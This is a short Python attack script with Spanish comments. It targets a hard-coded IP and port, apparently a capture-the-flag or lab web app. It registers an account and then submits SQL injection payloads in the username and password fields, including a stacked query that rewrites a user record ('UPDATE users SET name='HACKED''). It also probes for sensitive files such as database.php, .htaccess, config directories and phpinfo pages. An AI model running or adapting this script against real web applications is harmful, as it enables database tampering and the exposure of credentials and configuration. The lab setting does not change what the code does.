#!/usr/bin/env python3
"""
Explorar TODOS los endpoints posibles
"""
import requests
import random
import string

TARGET = "http://94.237.49.23:45329"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

session = requests.Session()
username = random_string()
password = random_string()

# Register y login
data = {'name': 'testuser', 'username': username, 'password': password}
session.post(f"{TARGET}/register.php", data=data)
session.post(f"{TARGET}/login.php", data={'username': username, 'password': password})

print(f"[*] Usuario: {username}:{password}\n")

# Probar inyección en diferentes campos del registro
print("[*] Probando inyecciones en campos de registro...")

# Intentar registrar con username malicioso
test_usernames = [
    "test' OR '1'='1",
    "test'; UPDATE users SET name='HACKED' WHERE id=1; --",
    "test\\'",
    "test\\\\",
]

for test_user in test_usernames:
    print(f"[*] Intentando username: {test_user[:30]}")
    s = requests.Session()
    try:
        data = {
            'name': 'normal',
            'username': test_user,
            'password': 'pass123'
        }
        resp = s.post(f"{TARGET}/register.php", data=data, timeout=5)
        
        if "successfully" in resp.text.lower() or resp.status_code == 302:
            print(f"    [+] Registro aceptado")
            
            # Intentar login
            resp2 = s.post(f"{TARGET}/login.php", data={'username': test_user, 'password': 'pass123'}, timeout=5)
            if resp2.status_code == 302 or "Yo," in resp2.text:
                print(f"    [+] Login exitoso")
        else:
            if "error" in resp.text.lower():
                print(f"    [-] Error en registro")
    except Exception as e:
        print(f"    [!] Exception: {str(e)[:50]}")

# Probar password malicioso
print("\n[*] Probando password malicioso...")
test_pass = "pass'; UPDATE users SET name='HACKED' WHERE id=1; --"
s = requests.Session()
try:
    data = {
        'name': 'normal',
        'username': random_string(),
        'password': test_pass
    }
    resp = s.post(f"{TARGET}/register.php", data=data, timeout=5)
    print(f"    Resultado: {resp.status_code}")
except Exception as e:
    print(f"    Exception: {e}")

# Probar acceder a otros archivos PHP
print("\n[*] Probando otros endpoints...")
endpoints = [
    '/vendor/autoload.php',
    '/utils/database.php',
    '/utils/smarty.php',
    '/templates_c/',
    '/cache/',
    '/configs/',
    '/.htaccess',
    '/phpinfo.php',
    '/info.php',
    '/test.php',
]

for endpoint in endpoints:
    resp = session.get(f"{TARGET}{endpoint}")
    if resp.status_code != 404:
        print(f"    [{resp.status_code}] {endpoint} - {len(resp.text)} bytes")
